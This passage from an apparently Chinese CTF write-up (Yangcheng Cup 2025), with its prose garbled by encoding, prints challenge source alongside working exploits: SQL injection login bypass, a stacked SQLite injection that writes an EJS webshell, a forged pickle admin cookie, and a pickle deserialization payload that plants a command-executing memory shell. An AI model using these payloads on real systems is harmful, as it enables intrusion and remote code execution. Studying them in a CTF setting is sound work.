string">'/register'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//todoing</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'é€€å‡ºæ—¶å‘ç”Ÿé”™è¯¯:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'é€€å‡ºå¤±è´¥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>  <span class="token keyword">const</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>  <span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">SELECT * FROM users WHERE (username = "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">") AND password = ("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>password<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  db<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> user</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'è´¦å·å¯†ç å‡ºé”™ï¼ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">id</span><span class="token operator">:</span> user<span class="token punctuation">.</span>id<span class="token punctuation">,</span>      <span class="token literal-property property">username</span><span class="token operator">:</span> user<span class="token punctuation">.</span>username<span class="token punctuation">,</span>      <span class="token literal-property property">isAdmin</span><span class="token operator">:</span> user<span class="token punctuation">.</span>is_admin<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> confirmPassword <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>password <span class="token operator">!==</span> confirmPassword<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ä¸¤æ¬¡è¾“å…¥çš„å¯†ç ä¸ä¸€è‡´'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  db<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>    <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">INSERT INTO users (username, password) VALUES ('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">', '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>password<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">')</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'æ³¨å†Œå¤±è´¥:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'æ³¨å†Œå¤±è´¥ï¼Œç”¨æˆ·åå¯èƒ½å·²å­˜åœ¨'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> filename <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filename<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">||</span> filename<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'WAF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>    filename<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'../../'</span><span class="token punctuation">)</span> <span class="token operator">||</span>    filename<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'.././'</span><span class="token punctuation">)</span> <span class="token operator">||</span>    filename<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span> <span class="token operator">||</span>    filename<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'//'</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'WAF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename <span class="token operator">||</span> path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'æ— æ•ˆæ–‡ä»¶å'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'documents'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">download</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'æ–‡ä»¶ä¸å­˜åœ¨'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server running on http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å“‡è¿˜æœ‰ wafï¼Œä½ åæ­»äº†å–µğŸ˜­ğŸ‘Š</p><p>æ­¤æ—¶æ‰å‘ç° &#x2F;login å¯ä»¥ç›´æ¥æ³¨å…¥ <code>1&quot;) or 1=1--+</code> å®ç°ç™»å½•</p><p>è®¿é—® &#x2F;upload å‘ç° upload æ¨¡æ¿æ²¡å†™ç©ºå‡ºæ¥äº†ï¼Œé‚£è¿˜è¯´å•¥äº†ï¼Œç›´æ¥ sqlite æ³¨å…¥ç»§ç»­å†™ upload.ejs åŒ…å« flag å°±å®Œäº‹äº†ï¼Œæ³¨æ„ä¾æ—§åœ¨ &#x2F;register æ³¨å…¥ï¼Œåªæœ‰è¿™é‡Œç”¨çš„æ˜¯ exec èƒ½å †å æ³¨å…¥</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">aaa&#39;,&#39;1&#39;);ATTACH DATABASE &#39;&#x2F;app&#x2F;views&#x2F;upload.ejs&#39; AS shell;create TABLE shell.exp (webshell text);insert INTO shell.exp (webshell) VALUES (&#39;&lt;%- include(&quot;&#x2F;fla4444444aaaaaagg.txt&quot;); %&gt;&#39;);--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/10/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025/IMG-20251011232238322.png"></p><hr><h2 id="ez-blog"><a href="#ez-blog" class="headerlink" title="ez_blog"></a>ez_blog</h2><p>è®¿å®¢åªèƒ½ç”¨è®¿å®¢è´¦å·ç™»å½•ï¼Œé‚£ä¹ˆå®¹æ˜“æ³¨æ„åˆ°å¸å¯† guest:guest</p><p>è¿”å› Tokenï¼š<code>8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622e</code></p><p>æ²¡è§è¿‡ï¼Ÿhex è§£ç å†ç”¨ base64 åŠ å¯†ä¸€ä¸‹å°±ä¼šå‘ç°æ ¼å¼å’Œ pickle åºåˆ—åŒ–å­—ç¬¦ä¸²å¾ˆåƒ</p><p>pickletools è§£ä¸€ä¸‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">    <span class="token number">0</span><span class="token punctuation">:</span> \x80 PROTO      <span class="token number">4</span>    <span class="token number">2</span><span class="token punctuation">:</span> \x95 FRAME      <span class="token number">75</span>   <span class="token number">11</span><span class="token punctuation">:</span> \x8c SHORT_BINUNICODE <span class="token string">'app'</span>   <span class="token number">16</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">0</span><span class="token punctuation">)</span>   <span class="token number">17</span><span class="token punctuation">:</span> \x8c SHORT_BINUNICODE <span class="token string">'User'</span>   <span class="token number">23</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">1</span><span class="token punctuation">)</span>   <span class="token number">24</span><span class="token punctuation">:</span> \x93 STACK_GLOBAL   <span class="token number">25</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token number">26</span><span class="token punctuation">:</span> <span class="token punctuation">)</span>    EMPTY_TUPLE   <span class="token number">27</span><span class="token punctuation">:</span> \x81 NEWOBJ   <span class="token number">28</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">3</span><span class="token punctuation">)</span>   <span class="token number">29</span><span class="token punctuation">:</span> <span class="token punctuation">&#125;</span>    EMPTY_DICT   <span class="token number">30</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">4</span><span class="token punctuation">)</span>   <span class="token number">31</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    MARK   <span class="token number">32</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'id'</span>   <span class="token number">36</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">5</span><span class="token punctuation">)</span>   <span class="token number">37</span><span class="token punctuation">:</span> K        BININT1    <span class="token number">2</span>   <span class="token number">39</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'username'</span>   <span class="token number">49</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">6</span><span class="token punctuation">)</span>   <span class="token number">50</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'guest'</span>   <span class="token number">57</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">7</span><span class="token punctuation">)</span>   <span class="token number">58</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'is_admin'</span>   <span class="token number">68</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">8</span><span class="token punctuation">)</span>   <span class="token number">69</span><span class="token punctuation">:</span> \x89     NEWFALSE   <span class="token number">70</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'logged_in'</span>   <span class="token number">81</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">9</span><span class="token punctuation">)</span>   <span class="token number">82</span><span class="token punctuation">:</span> \x88     NEWTRUE   <span class="token number">83</span><span class="token punctuation">:</span> u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">31</span><span class="token punctuation">)</span>   <span class="token number">84</span><span class="token punctuation">:</span> b    BUILD   <span class="token number">85</span><span class="token punctuation">:</span> <span class="token punctuation">.</span>    STOPhighest protocol among opcodes <span class="token operator">=</span> <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æŠŠ is_admin å­—æ®µä¿®æ”¹ä¸º true å³å¯ï¼Œæ€ä¹ˆä¿®æ”¹å‘¢ï¼ŒFalse æ˜¯ 89ï¼Œè€Œ True æ˜¯ 88ï¼Œç›´æ¥ä¿®æ”¹ hex å­—èŠ‚æµå³å¯ï¼š<code>8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94888c096c6f676765645f696e948875622e</code></p><p>ä»¥ admin è®¿é—® &#x2F;add å‘ç°æ²¡ä»€ä¹ˆåˆ«çš„ä¸œè¥¿ï¼Œé‚£ç›´æ¥æ‰“ååºåˆ—åŒ– payload å‘—</p><p>å†…å­˜é©¬ç›´æ¥æ‰“</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> C<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag åœ¨ &#x2F;thisisthefffflllaaaggg.txt</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request <span class="token keyword">as</span> flask_request<span class="token punctuation">,</span> g<span class="token keyword">import</span> sqlite3<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash<span class="token comment"># ç”¨æˆ·ç±»å®šä¹‰</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> user_id<span class="token punctuation">,</span> username<span class="token punctuation">,</span> is_admin<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> user_id        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username        self<span class="token punctuation">.</span>is_admin <span class="token operator">=</span> is_admin        self<span class="token punctuation">.</span>logged_in <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        serialized <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        hex_encoded <span class="token operator">=</span> serialized<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> hex_encoded    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>hex_encoded<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            serialized <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>hex_encoded<span class="token punctuation">)</span>            <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>serialized<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span>    static_folder<span class="token operator">=</span><span class="token string">'static'</span><span class="token punctuation">,</span>    static_url_path<span class="token operator">=</span><span class="token string">'/banbanbannonono'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token comment"># æ•°æ®åº“é…ç½®</span>DATABASE <span class="token operator">=</span> <span class="token string">'./blog.db'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>context_processor</span><span class="token keyword">def</span> <span class="token function">inject_variables</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> get_current_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token string">'current_year'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>year<span class="token punctuation">,</span>        <span class="token string">'is_admin'</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>is_admin <span class="token keyword">if</span> user <span class="token keyword">else</span> <span class="token boolean">False</span><span class="token punctuation">,</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>username <span class="token keyword">if</span> user <span class="token keyword">else</span> <span class="token string">''</span>    <span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">get_current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_hex <span class="token operator">=</span> flask_request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Token'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user_hex<span class="token punctuation">:</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>deserialize<span class="token punctuation">(</span>user_hex<span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">and</span> user<span class="token punctuation">.</span>logged_in<span class="token punctuation">:</span>            <span class="token keyword">return</span> user    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">get_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">'_database'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> db <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        db <span class="token operator">=</span> g<span class="token punctuation">.</span>_database <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>DATABASE<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>row_factory <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>Row    <span class="token keyword">return</span> db<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>teardown_appcontext</span><span class="token keyword">def</span> <span class="token function">close_connection</span><span class="token punctuation">(</span>exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">'_database'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token 